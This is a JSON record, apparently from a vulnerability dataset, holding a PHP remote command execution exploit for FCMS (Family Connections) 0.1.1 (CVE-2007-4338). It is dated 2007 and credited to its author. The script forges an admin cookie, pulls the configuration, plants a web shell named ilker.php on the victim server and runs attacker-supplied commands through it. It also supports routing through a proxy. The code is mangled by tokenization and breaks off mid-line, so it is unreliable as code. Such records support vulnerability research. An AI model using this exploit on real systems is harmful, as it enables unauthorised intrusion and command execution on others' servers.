{
    "text": "vul_name : FCMS ( Family Connections ) <= 0.1.1 Remote Command Execution Exploit ， vul_cve : CVE-2007-4338 ， vul_poc :  #  ! /usr/bin/php -q -d short_open_tag=on ， <? ， echo \" ，  # FCMS ( Family Connections ) <= 0.1.1 Remote Command Execution Exploit ，  # AUTHOR : ilker kandemir <ilkerkandemir [ at ] mynet.com> ，  # DOWNLOAD :  ，  # Thanks to rgod for the php code and Ajann for helps ， \" ;  ， echo \"Usage : php \". $ argv [ 0 ] .\" Host Path CMD ， Host : target server ( ip/hostname )  ， Path : path of FCMS ， Example :  ， php \". $ argv [ 0 ] .\" localhost /FCMS/ dir\" ;  ， die ;  ， } ， The problem is in index.php :  ， { ，  $ _SESSION [ 'login_id' ] = $ _COOKIE [ 'fcms_login_id' ]  ;  ， } ， This exploit create a ilker.php shell on the victim site ， error_reporting ( 0 )  ;  ， ini_set ( \"max_execution_time\" , 0 )  ;  ， ini_set ( \"default_socket_timeout\" , 5 )  ;  ， { ，  $ result=' ;  $ exa=' ;  $ cont=0 ;  ， { ， { $ result.=\" .\" ; } ， { $ result.=\" \". $ string [  $ i ]  ; } ， { $ exa.=\" \".dechex ( ord (  $ string [  $ i ]  )  ; } ， { $ exa.=\" 0\".dechex ( ord (  $ string [  $ i ]  )  ; } ，  $ cont+ ; if (  $ cont=15 ) { $ cont=0 ;  $ result.=\"\\r\\n\" ;  $ exa.=\"\\r\\n\" ; } ， } ， } ，  $ proxy_regex = ' ( \\b\\d{1 , 3}\\.\\d{1 , 3}\\.\\d{1 , 3}\\.\\d{1 , 3}\\ : \\d{1 , 5}\\b ) ' ;  ， { ， global $ proxy ,  $ host ,  $ port ,  $ html ,  $ proxy_regex ;  ，  $ ock=fsockopen ( gethostbyname (  $ host )  ,  $ port )  ;  ， echo 'No response from '. $ host.' : '. $ port ; die ;  ， } ， } ，  $ c = preg_match (  $ proxy_regex ,  $ proxy )  ;  ， echo 'Not a valid proxy.' ; die ;  ， } ，  $ parts=explode ( ' : ' ,  $ proxy )  ;  ， echo \"Connecting to \". $ parts [ 0 ] .\" : \". $ parts [ 1 ] .\" proxy.\\r\\n\" ;  ，  $ ock=fsockopen (  $ parts [ 0 ]  ,  $ parts [ 1 ]  )  ;  ， echo 'No response from proxy.' ; die ;  ， } ， } ， fputs (  $ ock ,  $ packet )  ;  ，  $ html=' ;  ，  $ html.=fgets (  $ ock )  ;  ， } ， } ，  $ html=' ;  ，  $ html.=fread (  $ ock , 1 )  ;  ， } ， } ， fclose (  $ ock )  ;  ， } ，  $ host= $ argv [ 1 ]  ;  ，  $ path= $ argv [ 2 ]  ;  ，  $ cmd=\" ;  ，  $ cmd.=\" \". $ argv [  $ i ]  ;  ， } ，  $ cmd=urlencode (  $ cmd )  ;  ，  $ port=80 ;  ，  $ proxy=\" ;  ， echo \"Step0 - See If ilker.php already exists.\\r\\n\" ;  ，  $ packet=\"GET \". $ p.\"ilker.php?cmd= $ cmd HTTP/1.0\\r\\n\" ;  ，  $ packet.=\"Host : \". $ host.\"\\r\\n\" ;  ，  $ packet.=\"Cookie : cmd= $ cmd\\r\\n\" ;  ，  $ packet.=\"Connection : Close\\r\\n\\r\\n\" ;  ， sendpacketii (  $ packet )  ;  ， { ， echo \"Exploit succeeded.\\r\\n\" ;  ，  $ temp=explode ( \"666999\" ,  $ html )  ;  ， die ( \"\\r\\n\". $ temp [ 1 ] .\"\\r\\n\" )  ;  ， } ， echo \"Step1 - Retrieving Configuration\\r\\n\" ;  ，  $ packet=\"GET \". $ p.\"index.php HTTP/1.0\\r\\n\" ;  ，  $ packet.=\"Host : \". $ host.\"\\r\\n\" ;  ，  $ packet.=\"Cookie : admin=ilker\\r\\n\" ;  ，  $ packet.=\"Connection : Close\\r\\n\\r\\n\" ;  ， sendpacketii (  $ packet )  ;  ，  $ temp=explode ( \"<textarea name=\\\"content\\\" cols=\\\"80\\\" rows=\\\"20\\\">\" ,  $ html )  ;  ，  $ config_file=explode ( \"</textarea><br /><input type=\\\"submit\\\" /></form>\" ,  $ temp [ 1 ]  )  ;  ，  $ new_file = str_replace ( '?>' , ' ，  $ fp=fopen ( \\'piggy_marty.php\\' , \\'w\\' )  ; ",
    "time": "2007.08.15"
}